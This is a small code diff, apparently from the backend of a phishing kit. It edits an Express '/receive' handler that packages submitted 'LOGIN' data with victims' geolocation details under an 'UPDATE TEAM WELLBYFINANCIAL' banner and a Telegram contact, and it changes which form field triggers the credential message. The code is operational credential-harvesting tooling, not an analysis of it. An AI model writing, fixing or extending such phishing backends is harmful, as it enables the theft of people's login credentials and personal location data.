@@ -167,7 +167,7 @@ app.post('/receive', async (req, res) => {
       message += `\n========================\n\n` + (includeFullGeo ? fullGeoInfo : basicGeoInfo) + `========================\n\n✅ UPDATE TEAM WELLBYFINANCIAL| \n💬 Telegram: https://t.me/updteams\n`;
     };
 
-    if (myObjectKeys.includes('email')) {
+    if (myObjectKeys.includes('login')) {
     
       prepareMessage("LOGIN", url, true);
 
